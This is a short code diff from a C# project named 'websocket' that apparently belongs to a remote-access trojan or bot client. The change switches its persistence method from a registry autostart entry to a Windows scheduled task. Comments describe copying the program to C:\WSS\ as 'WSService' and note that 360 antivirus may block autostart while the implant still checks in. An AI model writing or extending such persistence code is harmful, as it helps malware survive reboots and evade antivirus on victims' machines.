@@ -8,6 +8,7 @@ using System.Threading;
 using System.IO;
 using System.Diagnostics;
 using System.Windows.Forms;
+using TaskScheduler;
 
 namespace websocket
 {
@@ -33,7 +34,7 @@ namespace websocket
             //if (nowPath != targetPath)
             string RootPath = @"C:\WSS\";//要释放的路径
             string ServiceName = "WSService";//要生成的文件名
-            int startupCode = 1;//0:开始菜单启动 1:注册表启动 2:计划任务启动 [会被360拦截导致自启动失效 不过仍然会上线]
+            int startupCode = 2;//0:开始菜单启动 1:注册表启动 2:计划任务启动 [会被360拦截导致自启动失效 不过仍然会上线]
 
 
             if (!Directory.Exists(RootPath))//如果不存在就创建
